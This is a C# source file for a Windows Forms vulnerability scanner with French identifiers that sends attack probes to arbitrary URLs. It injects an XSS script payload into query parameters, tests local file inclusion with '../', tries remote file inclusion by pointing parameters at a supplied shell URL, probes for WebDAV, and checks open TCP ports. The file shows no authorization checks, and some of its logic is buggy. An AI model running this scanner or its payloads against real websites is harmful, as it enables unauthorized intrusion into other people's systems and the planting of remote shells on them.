using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SQl_SCanner
{
    class ScanneFaille
    {
        private MainForm form = GlobalVar.form;
        public void Scanne(string url)
        {
            try
            {
                SuprimerDansTrv(url);
                string sqli = SQLi(url).ToString();
                string ip = avoirip(url);

                string[] groupe = { url, sqli, DateTime.Now.ToString(), ip };

                if (sqli == "False")
                {
                    form.list_non_vulne.Invoke((MethodInvoker)(() =>
                    {
                        form.list_non_vulne.BeginUpdate();
                        form.list_non_vulne.Items.Add(new ListViewItem(groupe, 1));
                        form.list_non_vulne.EndUpdate();
                    }));
                }
                else
                {
                    form.list_vulne.Invoke((MethodInvoker)(() =>
                    {
                        form.list_vulne.BeginUpdate();
                        form.list_vulne.Items.Add(new ListViewItem(groupe));
                        form.list_vulne.EndUpdate();
                    }));
                }
            }
            catch (Exception) { }
        }
        
        private void SuprimerDansTrv(string url)
        {
            form.list_url.Invoke((MethodInvoker)(() =>
            {
                form.list_url.BeginUpdate();
                for (int i = 0; i < form.list_url.Items.Count; i++)
                {
                    if (form.list_url.Items[i].SubItems[0].Text == url)
                    {
                        form.list_url.Items[i].Remove();
                        break;
                    }
                }
                form.list_url.BeginUpdate();
            }));
            form.UpInfos();
        }
        public bool SQLi(string url)
        {
            if (!url.Contains("="))
            {
                return false;
            }
            else
            {
                sqli_check sqli = new sqli_check();
                if (sqli.demmareAnalyseFast(url))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }
        private char[] delimeteur = new char[] { '\r', '\n' };
        public bool Xss(string url)
        {
            HttpRequete hr = new HttpRequete();
            bool bl = false;
            for (int i = 0; (i <= (url.Split(delimeteur).Length - 1)); i++)
            {
                string page = hr.get((url.Split(delimeteur)[i].Trim().Split('=')[i] + ('=' + ('"' + "><script>alert(\'XSS_SUCCESSFUL\')</script>"))));
                if ((page.Contains("<script>alert(\'XSS_SUCCESSFUL\')</script>") && 
                    !page.Contains("You have an error in your SQL syntax")))
                {
                    bl = true;
                }
                else
                {
                    bl = false;
                }
            }
            return bl;
        }
        public bool WebDav_Scanner(string url)
        {
            HttpRequete hr = new HttpRequete();
            try
            {
                string urltrv = ("http://" + (url + "/webdav/"));

                string str = hr.get(urltrv);
                if (str.Contains("WebDAV testpage"))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }
        public bool Lfi(string link)
        {
            HttpRequete hr = new HttpRequete();
            bool bl = false;
            try
            {
                for (int i = 0; (i <= (link.Split(delimeteur).Length - 1)); i++)
                {
                    string v = (link.Split(delimeteur)[i].Trim().Split('=')[0] + "=../");
                    if (v.Contains("="))
                    {
                        string Source = hr.get(v);
                        if (Source.Contains("No such file or directory"))
                        {
                            bl = true;
                        }
                        else
                        {
                            bl = false;
                        }
                    }
                }
                return bl;
            }
            catch (Exception)
            {
                return false;
            }
        }
        private bool Rfi(string link, string SHELL_URL)
        {
            HttpRequete hr = new HttpRequete();
            try
            {
                bool bl = false;
                for (int i = 0; (i <= (link.Split(delimeteur).Length - 1)); i++)
                {
                    string v = (link.Split(delimeteur)[i].Trim().Split('=')[0] + ("="
                                + (SHELL_URL + "?")));
                    if (v.Contains("="))
                    {
                        string Source = hr.get(v);
                        if ((Source.Contains("RFI_SUCCESSFUL")
                                    && (!Source.Contains("$invulnerable")
                                    && (Source.Length > 20))))
                        {
                            bl = true;
                        }
                        else
                        {
                            bl = false;
                        }
                    }
                }
                return bl;
            }
            catch (Exception)
            {
                return false;
            }
        }
        public string avoirip(string url)
        {
            string hote = url.Split('/')[2];
            string code = "";
            try
            {
                IPAddress[] find = Dns.GetHostAddresses(hote);
                code = find[0].ToString();
            }
            catch
            {
                code = "N/A";
            }
            return code;
        }
        private bool TestPort(string ipString, int port)
        {
            IPAddress ip = IPAddress.Parse(ipString);
            bool test = false;
            try
            {
                System.Net.Sockets.Socket s = new System.Net.Sockets.Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                s.Connect(ip, port);
                if (s.Connected == true)
                    test = true;
                s.Close();
            }
            catch (SocketException)
            {
                test = false;
            }
            return test;
        }
    }
}
